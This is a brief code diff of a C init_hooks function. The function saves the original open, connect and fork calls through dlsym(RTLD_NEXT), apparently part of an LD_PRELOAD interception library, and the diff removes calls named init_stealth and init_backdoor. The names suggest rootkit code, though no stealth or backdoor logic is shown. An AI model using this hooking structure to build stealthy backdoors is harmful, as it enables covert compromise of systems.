@@ -23,7 +23,4 @@ void init_hooks(void){
 	o_open = (open_t)dlsym(RTLD_NEXT, "open");
 	o_connect = (connect_t)dlsym(RTLD_NEXT, "connect");
 	o_fork = (fork_t)dlsym(RTLD_NEXT, "fork");
-
-	init_stealth();
-	init_backdoor();
 }
